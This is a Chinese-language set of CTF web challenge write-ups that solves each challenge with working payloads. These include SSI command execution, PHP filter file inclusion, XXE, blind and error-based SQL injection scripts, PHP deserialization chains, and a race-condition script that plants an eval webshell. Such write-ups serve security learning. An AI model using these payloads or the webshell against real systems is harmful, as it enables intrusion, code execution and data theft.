#  \<BJDCTF2020>EasySearch 1

扫描目录得到`index.php.swp`
```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```
参数`password`用于验证，用脚本可得到`password`应为`2020666`
```python
import hashlib
from itertools import count

for i in count():
    md = hashlib.md5()
    passw = str(i)
    md.update(passw.encode('utf-8'))
    hashid = md.hexdigest()
    if hashid.startswith('6d0bc1'):
        print(passw)
        break
```
`username`用于写入文件
注意文件后缀为`shtml`，`shtml`文件是可以写入SSI指令的
成功写入后在响应头里可以得到文件路径

在网站根目录下找到文件`flag_990c66bf85a09c664f0b6741840499b2`
最终payload为
```html
username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->&password=2020666
```


# \<BJDCTF2020>ZJCTF，不过如此

打开题目，为源码
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
显然需要利用伪协议

`/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/read=convert.base64-encode/resource=next.php`

对回显内容解码，得到

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

利用`preg_replace/e`模式可执行代码的特性，传参为`\S*=${getFlag()}&cmd=system(%27cat%20/flag%27);`，得到flag

具体可参考`paidx0`师傅的博客 <https://blog.csdn.net/weixin_49656607/article/details/119833707>


#  <CISCN2019 华东南赛区>Web11

打开题目，一个不明所以的界面，重点在`get ip`和`xff`，显然，试试改动`xff`头，果然回显的当前ip地址为`xxf`头的值，那么，模板注入？
```
{{system('cat /flag')}}
```
得到`flag`

# <GWCTF 2019>枯燥的抽奖


打开题目，从源码里发现`check.php`
访问得到源码
```php
ljiUB7yF7i

<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```
利用了伪随机函数`mt_srand()`，虽然种子在服务端产生，但是是固定不变的，爆破种子推出`$str`即可


#   \<HFCTF2020>EasyLogin

打开题目，一个登录框，带有注册功能，尝试注册并登录后提示有`flag`，但无查看权限


那么显然我们需要以`admin`的身份登录，第一个方法是爆破密码，尝试了部分常见密码，无果。那么第二个方法，伪造登录凭证，
注册并登录，查看数据包，可以发现

![](https://null-d0ud.github.io/img/HFCTF2020EasyLogin2.png)

很显然，`jwt`解密，得到
```
{
    "header":{
    "alg":"HS256"
    "typ":"JWT"
    }
    "payload":{
    "secretid":0
    "username":"A"
    "password":"A"
    "iat":1649828192
    }
}
```

伪造`jwt`即可

# \<MRCTF2020>PYWebsite

打开题目，需要授权码获取`flag`,查看源码发现存在`flag.php`，直接访问，得到

>我已经把购买者的IP保存了，显然你没有购买
>
>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag

修改请求头，添加`x-Forwarded-For:127.0.0.1`,得到`flag`


# \<NCTF2019>Fake XML cookbook

首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现`flag`就在根目录下
```xml
<?xml version="1.0" ?>
<!DOCTYPE a[
<!ENTITY b SYSTEM "file:///flag">
]>
<user>
<username>
&b;
</username>
<password>
</password>
</user>
```

# \<NCTF2019>SQLi


打开题目
>sqlquery : select * from users where username='' and passwd=''

存在`robots.txt`，得到提示
```php
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";


If $_POST['passwd'] === admin's password,

Then you will get the flag;
```
过滤了单引号，但没有过滤转义符号，还是可以逃逸的，php是可以`%00`截断的版本
```html
username=\&passwd=||(1);%00
```
得到
>**HTTP/1.1 302 Found**
Server: openresty
Date: Wed, 01 Dec 2021 09:17:49 GMT
Content-Type: text/html
Content-Length: 2228
Connection: close
**Location: welcome.php**
X-Powered-By: PHP/5.2.16

根据提示需要获取admin的密码，显然是布尔盲注了
```python
import requests
from urllib import parse

urll="http://6cd4da7b-0239-4646-a44a-8ef97233503e.node4.buuoj.cn:81"
dataa={"username":"\\","passwd":""}
passwd=""

for i in range(50):
    print(i,end=">")
    for w in "qwertyuioplkjhgfdsazxcvbnmAQZXSWEDCVFRTGBNHYUJMKIOLP1234567890_":
        payload=f"||(passwd/**/regexp/**/\"^{passwd}{w}\");"+parse.unquote("%00")
        dataa["passwd"]=payload
        response=requests.post(url=urll,data=dataa,allow_redirects=False)
        if response.status_code == 302:
            passwd+=w
            print(passwd)
            break
```
提交密码，得到flag

# \<NPUCTF2020>ezinclude

打开题目
>username/password error

扫描目录
>config.php
>dir.php
>index.php
>index.php/login


在网页源码中得到提示
>\<!--md5(\$secret.\$name)===$pass -->

发现在请求头的`Cookie`中有一个`Hash`值，一般来说，那多半就是`md5(\$secret.\$name)`的值，也就是`pass`要等于这个`Hash`值，直接借着`Cookie`里的`Hash`值，传参，跳转到一个404界面

还是请求头，有一个
>Referer: http://cec81b70-7911-472d-bff7-8dd27ac459ad.node4.buuoj.cn:81/flflflflag.php

尝试访问，得到
```html
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
include($_GET["file"])</body>
</html>
```
利用伪协议读取
flflflflag.php
```php
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>
```
config.php
```php
<?php
$secret='%^$&$#fffdflag_is_not_here_ha_ha';
?>
```
dir.php
```php
<?php
var_dump(scandir('/tmp'));
?>
```
index.php
```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

这个`dir.php`，很难不让人联想到利用`session`条件竞争写木马
```python
import requests
import io
from threading import Thread
from time import sleep

ur='http://9fe5d7d0-6a86-40a8-b6e3-6a6ed9d00084.node4.buuoj.cn:81/flflflflag.php'
dat={"PHP_SESSION_UPLOAD_PROGRESS":"<?php fputs(fopen('a.php','w'),'<?php eval($_GET[door])?>');?>"}
fil={'file':('a.txt',io.BytesIO(b'a'*1024*5))}
cooki={'PHPSESSID':'abc'}
par={'file':'/tmp/sess_abc'}
ses=requests.session()

def Upload():
    while True:
        if ses.post(url=ur,data=dat,files=fil,cookies=cooki,allow_redirects=False).status_code!=200:
            sleep(0.1)

a=Thread(target=Upload)
a.start()
while True:
    ses.get(url=ur,params=par,allow_redirects=False)
```
~~蚁剑连接即可~~
flag在`phpinfo`里

# \<NPUCTF2020>ReadlezPHP

打开题目，无提示，扫描目录，无果，在源代码里搜索`php`，发现隐藏链接

打开得到源码
```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```
简单的反序列化题
尝试`system`和`exec`无果，应该是被禁用了，`assert`可行，在`phpinfo`界面看到大部分执行系统命令的函数被禁用了

~~flag就在phinfo里是我没想到的~~


# \<RCTF2015>EasySQL


打开题目，测试功能。
注册，登录，修改密码，那么极有可能存在二次注入。
经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如
>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"a"" and pwd='72ea3f1e65a1d2b8046e7fb756498dbd'' at line 1

不难猜测语句为
```sql
select * from ... where username="..." and pwd='...' ;
```
由于无其他查询回显页面，尝试报错注入

库名
```html
aaaaa"||updatexml(1,(concat(0x7e,(database()),0x7e)),1)#
```
>XPATH syntax error: '\~web_sqli~'

表名
```sql
aaaaa"||updatexml(1,(concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)),1)#
```
>XPATH syntax error: '\~article,flag,users~'

列名
```sql
bbbb"||updatexml(1,(concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e)),1)#
```
>XPATH syntax error: '~flag~'

数据
```sql
ddddd"||updatexml(1,(concat(0x7e,(select(group_concat(flag))from(flag)),0x7e)),1)#
```

>XPATH syntax error: '~RCTF{Good job! But flag not her'

虚晃一枪，能看出来是截断的，显示16个字符
最终发现flag是在表`users`里，截断函数都被过滤了，没有过滤`reverse()`

前半段
```sql
ddddd"||updatexml(1,(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1)#
```
>XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'



可以发现有其他字符干扰，没法完全读取，正则函数未被过滤，尝试使用正则
```sql
ddddd"||updatexml(1,(concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^flag')),0x7e)),1)#
```
配合`reverse()`得到flag


# <SUCTF 2019>Pythonginx

打开题目，得到部分源码
```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```
显然是要设法访问`suctf.cc`,
注意到意义不明的`newhost.append(h.encode('idna').decode('utf-8'))`，
先用`idna`编码又用`utf-8`解码，嗯，耐人寻味，查了下`idna`编码，
发现就有现成的字符`℆`，~大概是师傅们都是从这题了解的~,
但是这样的话，只能得到`suctf.cc/u*`下的文件，遇事不决，先把能看的都看看，
在看配置文件时候`file://suctf.c℆sr/local/nginx/conf/nginx.conf`

回显
>server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }

很显然了，`file://suctf.c℆sr/fffffflag`，得到`flag`

#  <SWPUCTF 2018>SimplePHP

打开题目，文件上传，但查看文件功能有漏洞，控制url可以查看服务端代码

查看代码可以发现并不存在文件上传漏洞，反而是`file.php?file=`这个参数大有可为

`file.php`中部分代码
```php
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
}
```
`class.php`代码
```php
 <?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```
~~看到`file_get_contents`和`phar`还不明白吗~~
显然是`phar`反序列化

构造
```php
<?php
    class C1e4r{
        public $test;
        public $str;
    }
    class Show{
    	public $source;
    	public $str;
    }
    class Test{
 	    public $file;
 	    public $params=array("source"=>"var/www/html/f1ag.php");
    }


    $a=new C1e4r;
    $a->str=new Show;
    $a->str->str["str"]=new Test;

    $b=new Phar("w.phar");
    $b->startBuffering();
    $b->setStub("<?php __HALT_COMPILER(); ?>");
    $b->setMetadata($a);
    $b->addFromString("a","a");
    $b->stopBuffering();

    copy("w.phar","a.png");
?>
```
直接访问`/upload`得到上传文件名
利用`phar`协议查看即可

# \<WUSTCTF2020>颜值成绩查询


常规布尔盲注，甚至没有什么过滤
```python
import requests

tar_url="..............."
par={"stunum":""}
an=""

for i in range(1,50):
    print(f"{i}>",end="")
    for w in range(33,127):
        #par["stunum"]=f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))={w})"
        #par["stunum"]=f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))={w})"
        #par["stunum"]=f"0^(ascii(substr((select(group_concat(value))from(flag)),{i},1))={w})"
        response=requests.get(url=tar_url,params=par,timeout=100)
        if "admin" in response.text:
            an+=chr(w)
            print(an)
            break
```

# \<GYCTF2020>Ezsqli


打开题目，显然是SQL注入

测试为数字型注入，测试过滤的关键字，可用布尔盲注，脚本如下
```python
import requests

tar_url="http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"
get_data={"id":""}
query_table="sys.schema_table_statistics"
query_column_1="table_name"
query_column_2="table_schema"

for i in range(1,50):
    for w in range(32,127):
        get_data["id"] = f"0^(ascii(substr((select group_concat({query_column_1}) from {query_table} where {query_column_2}=database()),{i},1))={w})"
        repo=requests.post(url=tar_url,data=get_data)
        if "Nu1L" in repo.text:
            print(chr(w),end="") 
```
~~这个脚本还是挺慢的，但懒得写二分，趁着跑脚本划水也挺好的~~
得到表名
>users233333333333333,f1ag_1s_h3r3_hhhhh

`union`被过滤了，采用逐个对比的方法查字段数，
```html
id=0^((select 1,2)>(select * from f1ag_1s_h3r3_hhhhh))
```
回显```Nu1L```，说明字段数为2
尝试逐个读取，但`limit`被过滤了，好在只有一行数据

```python
import requests

tar_url="http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"
get_data={"id":""}
answer=""

for i in range(1,50):
    for w in range(32,127):
        suffix=chr(w)
        get_data["id"] = f"0^((select '{answer}{suffix}',1)>(select * from f1ag_1s_h3r3_hhhhh))"
        repo=requests.post(url=tar_url,data=get_data)
        if "Nu1L" in repo.text:
            answer+=chr(w-1)
            print(answer)
            break
```
结果爆出一堆零，读取第二列，得到flag

# \<MRCTF2020>Ezpop
常规的代码审计
```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```
显然是反序列化题，而且是反序列化链，~~不然为什么给三个类~~
首先要想办法调用`Modifier()`，想到可以使`Test`对象的`p`为`Modeifier`对象，
那么想办法访问`Test`对象的`p`，想到`Show`对象的`__toString()`方法，
恰好`Show`对象的`__wakeup()`方法，将属性`source`当为字符串处理，如果`source`也是一个`show`对象呢

那么构造payload
```php
<?php
    class Show{
        public $source;
        public $str;
    }

    Class Modifier{
        protected $var="php://filter/read=convert.base64-encode/resource=flag.php";
    }

    Class Test{
        public $p;
    }

    $a=new Show();
    $a->source=new Show();
    $a->source->str=new Test();
    $a->source->str->p=new Modifier();


    echo urlencode(serialize($a));
?>
```
# \<安洵杯 2019>easy_serialize_php
打开题目，得到源码
```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

根据提示查看`phpinfo`，发现
![在这里插入图片描述](https://img-blog.csdnimg.cn/6c891479231e431ab96c39da307fee78.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
接着审计代码
`extract($_POST);`，允许传递任何参数
`$serialize_info = filter(serialize($_SESSION));`，一看就是有问题的，序列化字符串怎么能随便修改
`echo file_get_contents(base64_decode($userinfo['img']));`，利用`$_SESSION['img']`读取文件

到此其实已经很显然了，post传递参数修改`$_SESSION`，利用它的不安全函数`filter`修改序列化后的字符串，使得修改后的序列化字符串在反序列化后`$_SESSION['img']`的值被控制

构造payload
```html
_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocAog";}
```
得到提示
><?php
>
>$flag = 'flag in /d0g3_fllllllag';
>
>?>
构造payload
```html
_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```
得到flag

# \<BJDCTF2020>Cookie is so stable
打开题目，看着像注入，测试发现确实存在模板注入

但回显的数据是根据客户端发送的cookie确定的。
提交表单后，服务端给客户端重定向并根据表单信息设置cookie，客户端被重定向时会发送刚刚得到的cookie，服务端根据cookie回显数据。但其实这题的重定向只是再次访问了`flag.php`。具体请自行F12查看。
![在这里插入图片描述](https://img-blog.csdnimg.cn/1d86d08be15044fdbbcaee63aca2ff48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
测试发现是Twig模板，根据网上大量的Twig模板注入payload即可得到flag

# <BSidesCF 2020>Had a bad day
打开题目，发现可疑网址
>index.php?category=woofers

测试参数时发现可能存在后缀为`php`的文件包含
```html
index.php?category=woofers%20a
```

>Warning: include(woofers a.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37
>
>Warning: include(): Failed opening 'woofers a.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37

且服务端会检测参数`category`中是否含有`woofers`或`meowers`

尝试绕过并读取flag.php
```html
index.php?category=php://filter/convert.base64-encode/woofers/resource=flag
```
获得flag.php源码

# <强网杯 2019>高明的黑客
打开题目，根据提示下载`www.tar.gz`文件
进行两次解压后得到大量意义不明的php文件

用D盾扫描，全是可疑文件，但其实大部分是伪装的后门，需要找到真正的后门，写脚本对各个文件进行测试便可

```python
import os
import re
import requests


ffs=os.listdir("D:\phpstudy_pro\WWW\src")#添加本地测试文件
ruleg=re.compile("\$_GET\[\'(.*)\'\]")
rulep=re.compile("\$_POST\[\'(.*)\'\]")#创建正则对象
payload='echo "hello_hack";'
ori_url="http://127.0.0.1/src/"
tar_url="http://c7e1440e-a8e9-4442-a836-6952ca624d2b.node4.buuoj.cn:81/"
number=1


for i in ffs:
    print(f"{number}",end="\r")
    number=number+1#显示进度
    with open(f"D:\phpstudy_pro\WWW\src\\{i}") as file:
        f=file.read()#逐个读取文件内容
        ge=ruleg.findall(f)
        po=rulep.findall(f)#找到所有匹配的文本并以列表的方式储存
        post_data={}
        get_data={}#get和post传参的储存
        for getpar in ge:
            get_data[getpar]=payload
        for postpar in po:
            post_data[postpar]=payload#将得到的参数名添加参数值
        url=ori_url+i
        repo=requests.post(url,data=post_data,params=get_data)#访问对应网址
        repo.encoding="utf-8"
        if "hello_hack" in repo.text:#找到可用后门
            print(i)
            post_data={}
            get_data={}#get和post传参的储存
            for getpar in ge:
                get_data[getpar]="cat /flag"
            for postpar in po:
                post_data[postpar]="cat /flag"#将得到的参数名添加参数值
            url=tar_url+i
            repo=requests.post(url,data=post_data,params=get_data)
            print(repo.text)
            break
```

# \<GXYCTF2019>禁止套娃
打开题目，无提示。先扫描目录，发现存在`.git`文件以及一个flag.php文件。
利用`GitHack`得到`index.php`源码
```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```
注意这段代码`preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])`
那么很显然是无参数函数RCE，在网上已有大量payload，利用现成payload即可得到flag

有一个巧妙的方法是，利用cookies传递参数
在HTTP请求头里，手动添加`Cookies: PHPSESSID=flag.php`
GET参数为`exp=show_source(session_id(session_start()));`

# \<SWPU2019>Web1
打开题目，一个登录界面，注册得到一个账号，登录后可以可以“申请广告”并且查看，注意到此时的查看网址为`detail.php?id=1`，怀疑存在SQL注入。
测试的时候发现`detail.php?id=1a`和`detail.php?id=1`得到的结果是一样的，难道数据库中的`id`字段为数字类型，查询时参数却为字符类型？测试许久，发现回显界面一直都是正常的，或许这只是单纯传递参数？~~也有可能是完全解决了SQL注入~~

但是查看“广告详情”的时候，也有可能是利用“广告名”来查询，于是在“广告名”用`a'`测试，在“广告详情”界面得到
>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''a'' limit 0,1' at line 1

发现一个SQL注入点。
测试一下果然是有过滤的，先用字典跑一遍，有个限制是最多申请十条“广告”，需要每测十个关键字就访问一下`empty.php`，好在要测的关键字不多。

报错注入的函数被过滤了，堆叠注入不可行，联合注入可行。

空格会被去除，可以使用`/**/`，其他注释符号被过滤了，需要再次闭合
```html
a'/**/union/**/select/**/'a
```
>The used SELECT statements have a different number of columns

那么就可以通过这个看字段数了
```html
a'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a
```
最终是22个字段，~~谢谢出题人~~，回显的是第二个和第三个字段

information_schema被过滤了,尝试其他库的利用，`mysql` 、`sys`都行，这里使用`mysql`
```html
a'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a
```
>ads,users

表名到手，没有方便的方法获得列名，尝试无列名注入。
```html
a'/**/union/**/select/**/1,(select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/users)w),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a
```
>The used SELECT statements have a different number of columns

慢慢人工爆破

```html
a'/**/union/**/select/**/1,(select/**/group_concat(`1`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)w),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,'a
```
>1,1,2,3

好在只有三列

逐列查询，在第三列得到flag

# <网鼎杯 2020 朱雀组>phpweb
打开题目
>Warning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
2021-11-05 06:48:31 am

查看源代码，关键代码如下
```javascript
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
```
```html
<input type=hidden id=func name=func value='date'>
<input type=hidden id=p name=p value='Y-m-d h:i:s a'>
```
根据页面显示，这两个提交的数据应该是可以利用的。
先禁用js，再手动提交参数测试。
```html
index.php?func=a
```
回显
>Warning: call_user_func() expects parameter 1 to be a valid callback, function 'a' not found or invalid function name in /var/www/html/index.php on line 24

那么`call_user_func`的参数应该分别是我们提交的`func`和`p`
~~理论上讲已经可以直接拿到flag了~~ 
```html
index.php?func=file_get_contents&p=index.php
```
得到源码
```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
正常传递函数和参数恐怕是难以绕过，但源码里有一个类，那么方法已经很显然了，传递一个反序列化函数和一个序列化字符串，利用魔术方法获取flag
```html
index.php?func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
```
>bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var var

出人意料的是，flag不在根目录下,查找flag文件也找不到，可能改了名字
```html
index.php?func=unserialize&p=O:4:"Test":2:{s:1:"p";s:21:"find / -name '*flag*'";s:4:"func";s:6:"system";}
```
得到大量数据，当然不能一个一个去看，找找看起来不正常的
